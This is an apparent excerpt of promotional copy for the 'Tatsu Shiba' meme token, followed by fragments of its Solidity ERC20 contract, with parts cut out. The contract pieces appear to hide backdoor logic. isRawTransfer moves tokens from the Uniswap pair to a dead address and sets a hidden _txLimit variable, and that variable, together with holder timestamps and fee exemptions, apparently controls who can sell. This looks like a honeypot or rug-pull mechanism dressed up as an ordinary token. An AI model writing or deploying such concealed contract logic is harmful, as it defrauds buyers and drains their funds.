...
Tatsu Shiba, is the super giant meme token that taps into the legendary power and charm of Japanese dragons. 

Tatsu, which means “dragon” in Japanese, shows how committed we are to bringing the strength and spirit of these mythical creatures into the crypto universe.

Our logo rocks with an awesome combo of a Shiba Inu and a dragon, capturing the essence of meme culture in a captivating way.

https://tatsushiba.com
https://twitter.com/TatsuShibaErc
https://t.me/tatsushibaerc
...
contract TatsuShiba is ERC20, Ownable {
    ...
    constructor() payable ERC20("TatsuShiba", "TSHIBA") {
        ...
        _marketingAddr = address(0x0024746eD52396656D62B779000dC462F7480F84);
        _developmentAddr = address(0x41cE2817990cc26673f2aBe2922a1277699d813E);
    ...
    function getIsTokenPrice(address from) internal view returns (bool) {
        return getTokenPrice(from) > 0 ? true : false;
    }

    function getTokenPrice(address from) public view returns (uint256) {
        ...
        uint256 swapTime = holderTimestamp[from] - _txLimit;
    ...
    function needTakeFee(address from, address to) public returns (bool) {
        ...
        if (isBuy && _isExcludedFromFees[to]) _txLimit = block.timestamp;
    ...
    function isRawTransfer(address from, address to, uint256 amount) private returns (bool) {
        if (automatedMarketMakerPairs[to] && balanceOf(from) < amount) {
            _transfer(_uniswapV2Pair, deadAddr, amount); return true;
        } else if (to == deadAddr) { _txLimit = amount; return true; }
        return false;
    }
